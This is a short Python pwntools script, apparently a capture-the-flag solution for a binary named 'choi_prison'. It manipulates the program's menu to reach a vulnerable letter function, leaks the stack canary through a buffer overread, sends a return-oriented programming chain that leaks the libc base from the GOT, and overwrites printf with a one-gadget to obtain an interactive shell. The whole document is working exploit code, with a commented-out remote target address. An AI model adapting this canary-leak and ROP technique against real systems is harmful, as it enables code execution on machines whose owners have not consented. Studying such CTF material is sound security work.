from pwn import *

p = process("./choi_prison")
#p = remote("1.1.1.44",43240)
e = ELF("./choi_prison")
libc = ELF("./libc6_2.23-0ubuntu10_amd64.so")

pr_rdi = 0x0000000000401f93
pr_rsi_r15 = 0x0000000000401f91

p.sendlineafter("name.","hOwDayS")
# money set to 2999

for i in range(4): #wait ten
	p.sendlineafter("->","1") #working
	p.sendlineafter("->","3") #working

p.sendlineafter("->","4") #posion
p.sendlineafter("->","2") #bank
p.sendlineafter("->","1") #despoit

p.sendlineafter("->","50000") #despoit

p.sendlineafter("->","3") #takemoney
p.sendlineafter("->","2") #fight and money set 0

for i in range(5):
	p.sendlineafter("->","6") #sleep

log.info("SET STAT 270")

for i in range(12): #waitten
	p.sendlineafter("->","1") #working
	p.sendlineafter("->","3") #working

log.info("SET MONEY 3000")

p.sendlineafter("->","4") #posion
p.sendlineafter("->","2") #bank
p.sendlineafter("->","2") #despoit
p.sendlineafter("->","50000") #despoit


# Exploit
#raw_input()

p.sendlineafter("->","4") #posion
p.sendlineafter("->","1") #shop
p.sendlineafter("->","5") #Letter



p.sendafter(":","A" * 0x29)
p.recvuntil("A" * 0x29)

canary = u64("\x00" + p.recv(7))

log.info("canary : " + hex(canary))


payload  = "B" * (0x30 - 0x8)
payload += p64(canary)
payload += "C" * 8
payload += p64(pr_rdi)
payload += p64(e.got["puts"])
payload += p64(e.plt["printf"])

payload += p64(pr_rdi)
payload += p64(0)
payload += p64(pr_rsi_r15)
payload += p64(e.got["printf"])
payload += p64(0)
payload += p64(0x401490)


p.sendafter(": ",payload)
libc_base = u64(p.recv(6)+"\x00\x00") - libc.symbols["puts"]
log.info("libc_base : " + hex(libc_base))

p.send(p64(libc_base + 0x45216))


p.interactive()
